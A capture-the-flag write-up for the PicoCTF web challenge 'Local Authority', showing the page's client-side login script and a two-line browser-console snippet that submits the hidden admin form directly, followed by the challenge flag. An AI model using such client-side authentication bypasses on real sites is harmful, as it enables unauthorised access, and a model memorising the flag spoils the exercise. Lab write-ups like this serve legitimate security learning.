---
title: "Local Authority"
description: "Can you get the flag? Go to this website and see what you can discover."
date: 2025-08-26
category: "web"
author: "sealldev"
section: "PicoCTF"
tags: ["easy"]
# image: "/images/picoctf/websockfish/icon.png"
---

I started the webserver, and I am presented with a login page.

{{< image src="/images/picoctf/localauthority/login.png" alt="login page" >}}

I try 'admin:admin' but it fails, I decide to open the page source as the hint says the checks are 'client side'. I find this JavaScript:
```js
function filter(string) {
  filterPassed = true;
  for (let i =0; i < string.length; i++){
    cc = string.charCodeAt(i);
    
    if ( (cc >= 48 && cc <= 57) ||
          (cc >= 65 && cc <= 90) ||
          (cc >= 97 && cc <= 122) )
    {
      filterPassed = true;     
    }
    else
    {
      return false;
    }
  }
  
  return true;
}

window.username = "admin";
window.password = "admin";

usernameFilterPassed = filter(window.username);
passwordFilterPassed = filter(window.password);

if ( usernameFilterPassed && passwordFilterPassed ) {

  loggedIn = checkPassword(window.username, window.password);
  
  if(loggedIn)
  {
    document.getElementById('msg').innerHTML = "Log In Successful";
    document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
    document.getElementById('hiddenAdminForm').submit();
  }
  else
  {
    document.getElementById('msg').innerHTML = "Log In Failed";
  }
}
else {
  document.getElementById('msg').innerHTML = "Illegal character in username or password."
}
```

We don't care about the filter, which is checking character codes. We can just send the request to the admin form directly!

```js
document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
document.getElementById('hiddenAdminForm').submit();
```

Then, we can paste this in the browser console on the `/login.php` page and win!

Flag: `picoCTF{j5_15_7r4n5p4r3n7_05df90c8}`